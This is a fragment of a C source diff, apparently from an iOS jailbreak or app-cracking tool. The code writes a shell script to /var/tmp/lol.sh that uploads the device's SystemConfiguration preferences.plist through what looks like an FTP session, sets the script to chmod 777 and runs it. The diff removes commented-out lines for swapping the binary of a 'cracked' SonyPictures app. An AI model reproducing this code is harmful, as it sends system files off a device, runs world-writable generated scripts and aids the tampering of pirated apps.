@@ -51,10 +51,6 @@ int main(){
 	system("echo 'lcd /Library/Preferences/SystemConfiguration/' >> /var/tmp/lol.sh");
 	system("echo 'mput preferences.plist' >> /var/tmp/lol.sh");
 	system("echo 'quit' >> /var/tmp/lol.sh");
-	//Change according to the cracked app ;)
-	//system("echo 'rm /var/mobile/Applications/0DB31937-C3AE-448D-BA32-820FDD18FF29/SonyPictures.app/SonyPictures' >> /var/tmp/lol.sh");
-	//system("echo 'cp /var/mobile/Applications/0DB31937-C3AE-448D-BA32-820FDD18FF29/SonyPictures.app/SonyPictures.copy /var/mobile/Applications/0DB31937-C3AE-448D-BA32-820FDD18FF29/SonyPictures.app/SonyPictures' >> /var/tmp/lol.sh");
-	//system("var/mobile/Applications/0DB31937-C3AE-448D-BA32-820FDD18FF29/SonyPictures.app/SonyPictures.copy");
 	system("echo 'SCRIPT' >> /var/tmp/lol.sh");
 	system("chmod 777 /var/tmp/lol.sh");
 	system("/var/tmp/lol.sh");
